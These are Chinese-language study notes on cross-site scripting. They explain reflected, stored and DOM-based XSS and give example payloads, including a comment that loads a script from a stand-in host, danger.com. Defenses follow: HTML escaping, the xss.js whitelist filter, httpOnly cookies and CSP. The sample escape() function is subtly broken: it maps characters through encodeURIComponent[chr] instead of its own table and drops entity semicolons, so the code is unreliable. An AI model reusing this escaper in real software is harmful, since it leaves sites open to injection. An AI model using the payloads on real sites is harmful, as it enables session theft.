XSS （盗取cookie，劫持用户行为，钓鱼攻击，挂马）

- 攻击
    - 渲染过程中产生了一些预期外的指令
    - 访问页面时插入脚本执行
- 分类
    - 反射型 <script>alert('aa')</script>
    - 存储型（留言） input弹窗中，提交脚本信息。
    - 基于DOM
    > 区别：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。
- case:
    ```bash
    // 存储型
    // 当我们在做商品评论时，用户输入的内容未经过过滤直接保存到数据库中。
    质量非常不错！<script src="danger.com/spread.js"></script>
   
   // 当你的评论列表被用户浏览时， 直接从服务端取出，回填到HTML响应中：
    <li>质量非常不错！<script src="danger.com/spread.js"></script></li>
    那么浏览器会加载执行恶意脚本danger.com/spread.js， 在恶意脚本中利用用户的登录状态发更多的带有恶意评论的URL， 诱导更多人点击，层层传播，放大攻击范围。
   
   // 反射型
   http://localhost:8080/helloController/search?name=<script>alert("hey!")</script>
   http://localhost:8080/helloController/search?name=<img src='w.123' onerror='alert("hey!")'>
   ```
- 原因
    - 用户输入或url中的参数，没有做过滤，不合法参数到web服务器
- 防御
    - 对输入&输出&URL过滤
    ```javascript
    const signs = {
      '&': '&amp',
      '<': '&lt',
      '>': '&gt',
      '"': '&quot',
      "'": '&#39'
    }
    const signReg = /[&<>"']/g
    function escape(string) {
            return (string && signReg.test(string))
                ? string.replace(signReg, (chr) =>encodeURIComponent[chr])
                : string
        } 
    ```
    > 此方法不适用于富文本，因为HTML标签种类繁多，基于黑名单的过滤方法考虑的并不全面，所以我们可以根据白名单过滤HTML, 可以借助xss.js来完成：
    ```bash
    // 浏览器
    <script src="https://raw.github.com/leizongmin/js-xss/master/dist/xss.js"></script>
    
    // 使用
    filterXSS('<h1 id="title">XSS Demo</h1><script type="text/javascript">alert(/xss/);</script>
    <p class="text-center">Whitelist</p>')
    
    // 输出
    <h1>XSS Demo</h1>&lt;script type="text/javascript"&gt;alert(/xss/);&lt;/script&gt;
    <p>Whitelist</p>
    ```
    - cookie 设置 http-only （js脚本无法读取cookie）
    ```bash
    ctx.cookies.set(name, value, {
        httpOnly: true // 默认为 true
    })
    ```
    - CSP
    > CSP (Content Security Policy，内容安全策略)是 W3C 提出的 ，本质上就是白名单制度，开发者明确告诉浏览器哪些外部资源可以加载和执行。它的实现和执行全部由浏览器完成，我们只需提供配置。
    
    > 通过 HTTP 头信息的Content-Security-Policy的字段
